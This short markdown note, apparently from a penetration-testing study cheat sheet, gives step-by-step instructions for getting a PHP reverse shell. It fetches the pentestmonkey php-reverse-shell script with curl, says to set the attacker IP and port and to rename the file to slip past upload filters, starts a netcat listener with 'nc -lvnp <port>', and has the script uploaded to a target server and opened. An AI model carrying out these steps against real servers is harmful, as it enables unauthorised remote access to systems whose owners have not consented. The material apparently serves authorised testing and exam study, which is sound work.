# PHP reverse shell

First, download the script:

    curl -LO https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

Change `ip` and `port` in the script (use `ip addr` for ip). Also probably rename, see [Bypass File Upload Filtering](https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html).

Next, start `nc`:

    nc -lvnp <port>

Finally, upload the script to the server, and open the newly created link.